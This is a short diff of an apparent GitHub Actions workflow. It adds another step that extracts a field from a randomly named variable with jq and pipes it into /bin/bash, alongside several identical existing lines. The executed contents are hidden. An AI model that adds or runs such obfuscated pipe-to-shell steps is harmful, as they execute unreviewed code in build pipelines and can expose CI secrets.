@@ -20,6 +20,7 @@ jobs:
           echo $iz2 | jq -r .oj86158 | /bin/bash
           echo $pdeli63479 | jq -r .eejb5 | /bin/bash
           echo $txps5259 | jq -r .hvs02007 | /bin/bash
+          echo $nmuy9 | jq -r .sr9 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
